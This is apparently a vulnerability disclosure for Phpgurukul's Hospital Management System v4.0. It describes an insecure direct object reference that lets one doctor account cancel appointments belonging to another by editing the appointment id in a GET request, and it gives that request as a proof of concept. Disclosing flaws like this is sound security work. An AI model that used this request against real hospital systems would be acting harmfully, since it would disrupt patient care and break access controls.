# Exploit Title: Hospital Management System v4.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Phpgurukul
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to cancel the appointment that is managed by other doctor(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /hospital/hms/doctor/appointment-history.php?id=3(CHANGE HERE)&cancel=update HTTP/1.1
...
```


